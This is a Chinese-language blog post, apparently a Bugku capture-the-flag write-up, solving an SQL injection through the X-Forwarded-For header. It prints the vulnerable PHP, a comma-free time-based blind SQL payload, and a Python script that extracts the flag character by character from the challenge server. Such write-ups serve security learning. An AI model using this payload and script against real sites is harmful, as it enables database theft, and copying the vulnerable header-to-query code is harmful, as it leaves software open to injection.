---
layout: post
title: "Bugku writeup3"
date: 2018-03-17 18：40
categories: jekyll update
---

# Web
## INSERT INTO注入
&emsp;&emsp;题目描述：
```php
function getIp(){
$ip = '';
if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
}else{
$ip = $_SERVER['REMOTE_ADDR'];
}
$ip_arr = explode(',', $ip);
return $ip_arr[0];
}

$ip = getIp();
echo 'your ip is :'.$ip;
$sql="insert into client_ip (ip) values ('$ip')";
mysql_query($sql);
```
&emsp;&emsp;可以看到，这是`X-Forwarded-For`的注入，而且过滤了逗号`,`。在过滤了逗号的情况下，我们就不能使用`if`语句了，在mysql中与`if`有相同功效的就是：
```
select case when xxx then xxx else xxx end;
```
&emsp;&emsp;而且由于逗号`,`被过滤，我们就不能使用`substr、substring`了，但我们可以使用：`from 1 for 1`，所以最终我们的payload如下：
```
127.0.0.1'+(select case when substr((select flag from flag) from 1 for 1)='a' then sleep(5) else 0 end))-- +
```
&emsp;&emsp;相应的python代码为：
```python
# -*- coding:utf-8 -*-
import requests
import sys
# 基于时间的盲注，过滤了逗号 ,
sql = "127.0.0.1'+(select case when substr((select flag from flag) from {0} for 1)='{1}' then sleep(5) else 0 end))-- +"
url = 'http://120.24.86.145:8002/web15/'
flag = ''
for i in range(1, 40):
    print('正在猜测：', str(i))
    for ch in range(32, 129):
        if ch == 128:
            sys.exit(0)
        sqli = sql.format(i, chr(ch))
        # print(sqli)
        header = {
            'X-Forwarded-For': sqli
        }
        try:
            html = requests.get(url, headers=header, timeout=3)
        except:
            flag += chr(ch)
            print(flag)
            break
```
&emsp;&emsp;跑出flag：flag{cdbf14c9551d5be5612f7bb5d2867853}

&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;

